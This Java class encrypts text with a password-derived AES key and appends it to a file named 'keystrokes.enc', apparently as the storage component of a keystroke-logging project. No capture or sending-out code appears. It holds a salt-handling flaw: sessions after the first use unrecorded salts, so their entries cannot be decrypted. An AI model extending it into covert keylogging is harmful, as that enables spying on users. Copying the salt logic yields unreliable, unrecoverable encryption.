package com.github.giorgosg1an;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.security.spec.KeySpec;
import java.util.Base64;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;

public class EncryptedLogger {
    private final SecretKeySpec key;
    private static final File LOG_FILE = new File("logs/keystrokes.enc");

    public EncryptedLogger(char[] password) throws Exception {
        
        byte[] salt = generateRandomSalt();
        this.key = deriveKey(password, salt);

        LOG_FILE.getParentFile().mkdirs();

        if (!LOG_FILE.exists()) {
            try(BufferedWriter writer = new BufferedWriter(new FileWriter(LOG_FILE))) {
                
            String encodedSalt = Base64.getEncoder().encodeToString(salt);
            writer.write("SALT::" + encodedSalt);
            writer.newLine(); 
            }
        }
    }

    private byte[] generateRandomSalt() {
        byte[] salt = new byte[16];

        new SecureRandom().nextBytes(salt);
        return salt;
    }

    private SecretKeySpec deriveKey(char[] password, byte[] salt) throws Exception {
        SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");

        KeySpec spec = new PBEKeySpec(password, salt, 65536, 128); // 128 bit AES

        SecretKey tmp = factory.generateSecret(spec);
        return new SecretKeySpec(tmp.getEncoded(), "AES");
    }

    private IvParameterSpec generateRandomIV() {
        byte[] iv = new byte[16];
        new SecureRandom().nextBytes(iv);
        return new IvParameterSpec(iv);
    }

    public void encryptAndWrite(String plaintext) throws Exception {
        IvParameterSpec iv = generateRandomIV();

        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, key, iv);

        byte[] encrypted = cipher.doFinal(plaintext.getBytes(StandardCharsets.UTF_8));

        String encodedIV = Base64.getEncoder().encodeToString(iv.getIV());
        String encodedCipher = Base64.getEncoder().encodeToString(encrypted);

        String outputLine = encodedIV + "::" + encodedCipher;

        LOG_FILE.getParentFile().mkdirs();
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(LOG_FILE, true))) {
            writer.write(outputLine);
            writer.newLine();
        }
    }
}
